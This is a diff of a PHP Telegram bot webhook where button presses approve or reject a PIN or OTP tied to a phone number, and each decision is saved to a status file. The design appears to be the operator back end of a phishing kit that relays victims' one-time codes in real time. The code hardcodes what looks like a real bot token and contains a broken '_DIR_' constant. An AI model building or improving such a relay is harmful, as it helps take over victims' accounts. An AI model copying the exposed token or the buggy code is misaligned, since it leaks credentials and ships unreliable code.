@@ -1,34 +1,70 @@
 <?php
-$token = "8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8";
-$update = json_decode(file_get_contents('php://input'), true);
+$token = "8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8"; // put your real bot token here
 
-if(isset($update['callback_query'])){
-    $callback = $update['callback_query'];
-    $data = $callback['data']; // approve_pin_0712345678
-    $chatId = $callback['message']['chat']['id'];
-    $messageId = $callback['message']['message_id'];
-    $callbackId = $callback['id'];
+// Get Telegram update safely
+$update = json_decode(file_get_contents("php://input"), true);
 
-    $parts = explode('_', $data);
-    if(count($parts) < 3) return;
+// Debug log (VERY IMPORTANT for troubleshooting)
+file_put_contents("log.txt", date("Y-m-d H:i:s") . " | " . json_encode($update) . "\n", FILE_APPEND);
 
-    $action = $parts[0]; // approve/reject
-    $type   = $parts[1]; // pin/otp
+// Check if button was clicked
+if(isset($update["callback_query"])){
+
+    $callback = $update["callback_query"];
+
+    $callbackId = $callback["id"];
+    $data = $callback["data"] ?? "";
+    $chatId = $callback["message"]["chat"]["id"];
+    $messageId = $callback["message"]["message_id"];
+
+    // Split safely
+    $parts = explode("_", $data);
+
+    // Prevent crash if format is wrong
+    if(count($parts) < 3){
+
+        // Still answer Telegram so button doesn't freeze
+        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?callback_query_id=$callbackId&text=Invalid data&show_alert=false");
+        exit();
+    }
+
+    $action = $parts[0]; // approve / reject
+    $type   = $parts[1]; // pin / otp
     $phone  = $parts[2]; // phone number
 
-    // ====== Write status to file ======
+    // Validate values (extra safety)
+    if(!in_array($action, ["approve","reject"]) || !in_array($type, ["pin","otp"])){
+
+        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?callback_query_id=$callbackId&text=Invalid format&show_alert=false");
+        exit();
+    }
+
+    // ===== SAVE STATUS (JSON) =====
     $file = _DIR_ . "/status.json";
-    $statuses = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
+
+    $statuses = [];
+    if(file_exists($file)){
+        $statuses = json_decode(file_get_contents($file), true);
+    }
+
     $statuses[$phone][$type] = $action;
+
     file_put_contents($file, json_encode($statuses));
 
-    // Edit Telegram message
-    $text = ($action == 'approve') ? "✅ " . strtoupper($type) . " Approved" : "❌ " . strtoupper($type) . " Rejected";
-    $text = urlencode($text);
-    file_get_contents("https://api.telegram.org/bot$token/editMessageText?chat_id=$chatId&message_id=$messageId&text=$text");
+    // ===== RESPONSE MESSAGE =====
+    if($action == "approve"){
+        $text = "✅ " . strtoupper($type) . " Approved";
+    } else {
+        $text = "❌ " . strtoupper($type) . " Rejected";
+    }
 
-    // Answer callback so Telegram knows button worked
-    file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?callback_query_id=$callbackId&text=Action recorded&show_alert=false");
+    $text_encoded = urlencode($text);
+
+    // ===== EDIT TELEGRAM MESSAGE =====
+    file_get_contents("https://api.telegram.org/bot$token/editMessageText?chat_id=$chatId&message_id=$messageId&text=$text_encoded");
+
+    // ===== VERY IMPORTANT: MAKE BUTTON CLICKABLE =====
+    file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?callback_query_id=$callbackId&text=Done&show_alert=false");
 
     exit();
 }
